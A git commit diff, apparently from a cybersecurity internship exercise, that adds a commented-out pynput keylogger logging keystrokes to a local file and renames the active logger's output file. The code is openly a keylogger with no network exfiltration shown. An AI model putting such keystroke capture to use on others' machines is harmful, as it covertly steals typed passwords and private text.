cab8a70a18eff71245f2ec9224227b2fc8fa0fc0
Jay Vaja <jayvaja56@gmail.com>
2024-06-10 10:55:49 +0530

    Upgrade keylogger Functionality

--- .history/PRODIGY_CS_04/Key_Logger_20240610105113.py
+++ .history/PRODIGY_CS_04/Key_Logger_20240610105113.py
@@ -1,9 +1,30 @@
+# from pynput.keyboard import Key, Listener
+
+# log_file = "/Users/jayvaja/VS/Prodigy Infotech Internship/PRODIGY_CS_04/keylog.txt" 
+
+# def on_press(key):
+#     try:
+#         with open(log_file, "a") as f:
+#             f.write(f"{key}\n")
+#     except Exception as e:
+#         print(f"Error logging key: {e}")
+
+# def on_release(key):
+#     if key == Key.esc:
+#         return False  # Stop listener
+
+# # Create a listener for keyboard events
+# with Listener(on_press=on_press, on_release=on_release) as listener:
+#     listener.join()
+
+
+
 from pynput import keyboard
 from datetime import datetime
 import threading
 import os
 
-log_file = "/Users/jayvaja/VS/Prodigy Infotech Internship/PRODIGY_CS_04/keylog.txt"
+log_file = "/Users/jayvaja/VS/Prodigy Infotech Internship/PRODIGY_CS_04/key_log.txt"
 
 def write_to_file(content):
     with open(log_file, "a") as log:
